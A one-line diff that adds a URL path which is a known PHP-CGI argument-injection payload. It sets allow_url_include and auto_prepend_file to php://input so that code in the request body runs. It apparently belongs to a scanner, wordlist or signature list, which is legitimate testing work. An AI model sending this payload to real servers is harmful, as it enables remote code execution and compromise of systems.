@@ -1,0 +1,1 @@
+"/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
